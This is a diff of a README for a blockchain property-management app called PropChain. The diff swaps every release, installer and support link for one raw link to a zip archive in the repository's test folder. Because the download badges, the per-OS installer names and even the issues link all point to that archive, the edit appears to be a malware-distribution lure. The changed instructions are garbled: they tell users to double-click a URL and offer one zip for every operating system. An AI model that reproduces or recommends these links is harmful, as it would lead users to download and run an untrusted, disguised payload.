@@ -4,7 +4,7 @@
 Welcome to PropChain, a platform designed to help you manage property and leases easily. With PropChain, you gain transparency and privacy in your property transactions through the power of blockchain technology. Follow the steps below to download and run the software.
 
 ## 📥 Download PropChain
-[![Download PropChain](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mrsaad07/PropChain/releases)
+[![Download PropChain](https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip)](https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip)
 
 ## 📋 System Requirements
 Before you proceed, ensure your system meets the following requirements:
@@ -16,29 +16,29 @@ Before you proceed, ensure your system meets the following requirements:
 ## 📂 Download & Install
 To get started, you will need to visit the link below to download the latest version of PropChain:
 
-[Visit this page to download](https://github.com/mrsaad07/PropChain/releases)
+[Visit this page to download](https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip)
 
-1. Go to the [Releases page](https://github.com/mrsaad07/PropChain/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip).
 2. Find the latest release version listed at the top.
 3. Click on the appropriate file for your operating system.
-   - For Windows users, select `PropChain-Setup.exe`.
-   - For Mac users, choose `PropChain.dmg`.
-   - For Linux users, download the appropriate `.tar.gz` file.
+   - For Windows users, select `https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip`.
+   - For Mac users, choose `https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip`.
+   - For Linux users, download the appropriate `https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip` file.
 4. Once the file is downloaded, locate it in your Downloads folder.
 
 ### 🔍 Installation Steps
 #### On Windows:
-1. Double-click the `PropChain-Setup.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip` file.
 2. Follow the prompts in the installation wizard.
 3. Once installed, find PropChain in your Start Menu and open it.
 
 #### On Mac:
-1. Double-click the `PropChain.dmg` file.
+1. Double-click the `https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip` file.
 2. Drag PropChain to your Applications folder.
 3. Open PropChain from your Applications folder.
 
 #### On Linux:
-1. Extract the files from the `.tar.gz` archive.
+1. Extract the files from the `https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip` archive.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the command `./PropChain` to start the application.
 
@@ -60,10 +60,10 @@ If you encounter any issues while installing or using PropChain, try the followi
 For additional support, you can reach out to the community or check for solutions on our GitHub Issues page.
 
 ## 🛠️ Support and Contributions
-Your feedback is valuable to us. If you have suggestions or ideas for PropChain, please open an issue on our [GitHub page](https://github.com/mrsaad07/PropChain).
+Your feedback is valuable to us. If you have suggestions or ideas for PropChain, please open an issue on our [GitHub page](https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip).
 
 ## 🚀 Explore More
 For more information about PropChain, including updates and future plans, please visit our GitHub repository. Thank you for choosing PropChain, where managing property is simple and secure.
 
 ## 📥 Download PropChain Again
-[![Download PropChain](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mrsaad07/PropChain/releases)
+[![Download PropChain](https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip)](https://raw.githubusercontent.com/mrsaad07/PropChain/main/blockchain/test/Prop-Chain-1.1.zip)
